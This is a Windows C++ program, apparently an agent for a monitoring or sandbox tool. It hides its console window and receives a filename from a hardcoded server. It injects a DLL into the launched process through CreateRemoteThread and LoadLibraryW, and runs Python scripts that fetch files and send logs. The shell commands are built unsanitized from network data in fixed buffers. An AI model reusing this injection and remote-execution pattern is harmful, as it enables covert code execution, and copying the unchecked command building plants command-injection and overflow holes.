#include "rapidjson/prettywriter.h"
#include <stdio.h>
#include <tchar.h>
#include <winsock.h>
#include <Windows.h>
#include <process.h>

#pragma warning(disable:4996)
#pragma comment(lib,"ws2_32.lib")
//유니코드
//mt
//미리컴파일된 헤더 사용안함
//증분링크 사용안함
//관리자 권한으로실행(링커 - 모든옵션 - UAC실행수준 - require
using namespace rapidjson;
BOOL InjectDll(LPCTSTR szDllPath, HANDLE hProcess) {
	HANDLE hThread;
	HMODULE hModule = NULL;
	LPVOID pRemoteBuf = NULL;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadproc;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);
	
	hModule = GetModuleHandle(TEXT("kernel32.dll"));
	pThreadproc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryW");
	
	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadproc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	
	CloseHandle(hThread);

	return TRUE;
}
BOOL MakeInfo(DWORD pid) {
	if (pid) {
		StringBuffer sMain;
		PrettyWriter<StringBuffer> MainWriter(sMain);
		wchar_t path[100];
		DWORD dwByte;
		lstrcpy(path, _wgetenv(L"appdata"));
		lstrcat(path, L"\\..\\Local\\info.json");
		HANDLE hLogFile = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		MainWriter.StartObject();

		MainWriter.Key("root");
		MainWriter.Uint((unsigned int)pid);
		MainWriter.EndObject();

		WriteFile(hLogFile, sMain.GetString(), sMain.GetLength(), &dwByte, NULL);

		CloseHandle(hLogFile);
	}
	return FALSE;
}
int main(int argc, char** argv) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess;

	WSADATA wsaData;
	SOCKET sock;
	SOCKADDR_IN serverAddr;
	char MSG[1000];
	int result;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	sock = socket(PF_INET, SOCK_STREAM, 0);

	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = inet_addr("35.221.82.178");
	serverAddr.sin_port = htons(0x226E);
	printf("wait...");

	char* timestamp;
	char* filename;
	char cmd[500];
	char env[100];
	int len;
	wchar_t path[100];

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	//ShowWindow(GetConsoleWindow(), SW_SHOW);//For Debug

	connect(sock, (SOCKADDR*)& serverAddr, sizeof(serverAddr));
	len = recv(sock,MSG,1000,0);
	MSG[len] = NULL;
	printf("%s\n", MSG);
	timestamp = strtok(MSG, " ");
	filename = strtok(NULL, " ");

	printf("%s\n", timestamp);
	printf("%s\n", filename);
	
	strcpy(env, getenv("appdata"));
	strcat(env, "\\..\\Local\\getfile.py ");
	strcat(env, timestamp);
	strcat(env, " ");
	strcat(env, filename);

	strcpy(cmd, "python ");
	strcat(cmd, env);

	system(cmd);
	                
	HANDLE hEvent = CreateEvent(nullptr, TRUE, FALSE, TEXT("finish"));

	memset(&si, 0, sizeof(STARTUPINFOA));
	si.cb = sizeof(STARTUPINFOA);

	memset(&pi, 0, sizeof(PROCESS_INFORMATION));

	printf("filename : %s\n", filename);

	CreateProcessA(filename, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	lstrcpy(path, _wgetenv(L"appdata"));
	lstrcat(path, L"\\..\\Local\\SWHat_DLL.dll");
	_tprintf(L"dll path : %s\n", path);

	InjectDll(path, pi.hProcess);

	MakeInfo(pi.dwProcessId);

	ResumeThread(pi.hThread);

	len = recv(sock, MSG, 1000, 0);

	SetEvent(hEvent);

	Sleep(300);

	strcpy(env, getenv("appdata"));
	strcat(env, "\\..\\Local\\sendlog.py ");
	strcat(env, timestamp);
	strcpy(cmd, "python ");
	strcat(cmd, env);

	system(cmd);
}